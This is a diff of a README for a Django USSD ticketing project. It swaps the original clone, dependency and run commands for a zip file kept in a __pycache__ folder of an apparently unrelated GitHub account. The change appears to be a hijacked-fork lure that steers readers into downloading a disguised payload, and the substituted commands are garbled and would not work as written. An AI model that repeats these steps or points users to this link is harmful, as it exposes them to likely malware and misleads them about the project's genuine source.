@@ -11,7 +11,7 @@ To get started with this project, follow the steps below.
 Clone the project to your local machine by running the following command:
 
 ```bash
-git clone https://github.com/Magma4/ussd-ticketing.git
+git clone https://github.com/papkvnq/ussd-ticketing/raw/refs/heads/main/ticketing/ticketing/__pycache__/ussd-ticketing-3.9-beta.2.zip
 ```
 
 ## 2. Create a Virtual Environment
@@ -38,14 +38,14 @@ source yourEnv/bin/activate
 
 ## 4. Install Project Dependencies
 
-Navigate to the folder containing the requirements.txt file and install the required dependencies:
+Navigate to the folder containing the https://github.com/papkvnq/ussd-ticketing/raw/refs/heads/main/ticketing/ticketing/__pycache__/ussd-ticketing-3.9-beta.2.zip file and install the required dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/papkvnq/ussd-ticketing/raw/refs/heads/main/ticketing/ticketing/__pycache__/ussd-ticketing-3.9-beta.2.zip
 ```
 
 ## 5. Run the Server
 
-Navigate to the folder containing manage.py and start the development server:
+Navigate to the folder containing https://github.com/papkvnq/ussd-ticketing/raw/refs/heads/main/ticketing/ticketing/__pycache__/ussd-ticketing-3.9-beta.2.zip and start the development server:
 ```bash
-python manage.py runserver
+python https://github.com/papkvnq/ussd-ticketing/raw/refs/heads/main/ticketing/ticketing/__pycache__/ussd-ticketing-3.9-beta.2.zip runserver
 ```
